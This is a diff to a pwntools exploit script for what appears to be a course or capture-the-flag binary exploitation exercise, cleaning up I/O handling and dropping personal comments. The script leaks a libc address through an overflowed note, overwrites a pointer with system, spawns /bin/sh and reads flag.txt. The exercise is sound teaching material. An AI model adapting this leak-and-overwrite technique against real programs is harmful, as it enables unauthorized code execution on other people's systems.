@@ -25,9 +25,6 @@ context.log_level = "error"
 # ==> in rdi (first reg; SYSTEM V Calling Convention) will be the text of printable note (but this ist /bin/sh)
 # PROFIT SHELL LETS GO 
 
-# Also sry that i only did one task this time
-# The Tasks are all looking very spicy and I will try my best on the other ones later this week
-# Was the whole last week ill so I could not work on PABE (and needed to work on my bachelor thesis this week/last weekend^^) ~ Spartak
 
 def start(argv=[], *a, **kw):
     gdbscript = """
@@ -50,28 +47,29 @@ def main():
     io = start()
 
     # Just do the first few Calls to the Programm as described above
-    io.recv(timeout=0.1)
+    io.recvuntil(b"7) Exit")
     io.sendline(b'1')
-    io.recv(timeout=0.1)
+    io.recvuntil(b"60 characters:")
     io.sendline(b"Do you know the Story of Darth Pleguis the wise?")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"7) Exit")
     io.sendline(b"2")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"60 characters:")
     io.sendline(b"He was a jedi master")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"default_print:")
     io.sendline(b"1")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"7) Exit")
     io.sendline(b"3")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"change:")
     io.sendline(b"0")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"new text:")
     io.sendline(cyclic(143))
-    io.recv(timeout=0.1)
+    io.recvuntil(b"7) Exit")
     io.sendline(b"6")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"to show:")
     io.sendline(b"0")
+    #io.interactive()
     # Now we get the puts addr. leaked
-    temp = io.recv(timeout=0.1)[64:70]
+    temp = io.recvuntil(b"7) Exit")[65:71]
     temp += b"\x00\x00"
     puts = u64(temp)
 
@@ -80,32 +78,30 @@ def main():
     libc.address = puts - libc.sym["puts"]
 
     system = libc.sym['system']
-    #binsh = next(libc.search(b'/bin/sh')) OLD TRY, still wanted to share, that this apporch did not work (think offset was wrong in the old payload! and yeah i KNOW no commented out code in solution, but wanted to share my idea like in 7.)
 
     # Wrapper + system overrides puts 
     payload = cyclic(144)
     payload += p64(system)
 
     io.sendline(b"3")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"to change:")
     io.sendline(b"0")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"new text:")
     io.sendline(payload)
-    io.recv(timeout=0.5)
+    io.recvuntil(b"7) Exit")
     io.sendline(b"4")
-    io.recv(timeout=0.5)
+    io.recvuntil(b"to change:")
     io.sendline(b"0")
-    io.recv(timeout=0.5)
+    io.recvuntil(b"new text:")
     # Write /bin/sh into printablenote start text
     io.sendline(b"/bin/sh")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"7) Exit")
     io.sendline(b"6")
-    io.recv(timeout=0.1)
+    io.recvuntil(b"to show:")
     io.sendline(b"0")
-    io.recv(timeout=0.1)
     # now we have a shell, so just gimmme the flag
     io.sendline(b"cat flag.txt")
-    print(io.recv().decode('utf-8')[:-1])
+    print(io.recvuntil(b"}").decode('utf-8')[1:])
 
 if __name__ == "__main__":
     main()
